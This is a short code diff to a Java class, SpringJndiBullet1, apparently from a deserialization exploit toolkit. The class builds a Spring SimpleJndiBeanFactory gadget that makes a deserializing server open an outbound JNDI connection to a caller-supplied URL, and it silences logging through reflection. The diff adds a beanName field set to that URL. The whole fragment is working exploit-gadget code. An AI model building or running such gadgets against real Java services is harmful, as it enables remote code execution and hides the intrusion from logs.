@@ -21,10 +21,13 @@ public class SpringJndiBullet1 extends AbstractBullet<Object> {
     @Require(name = "jndiURL", detail = "向外发起JNDI连接")
     public String jndiURL;
 
+    private String beanName;
+
     @Override
     public Object getObject() throws Exception {
         SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
         bf.setShareableResources(jndiURL);
+        beanName = jndiURL;
         ReflectionHelper.setFieldValue(bf, "logger", new NoOpLog());
         ReflectionHelper.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
         return bf;
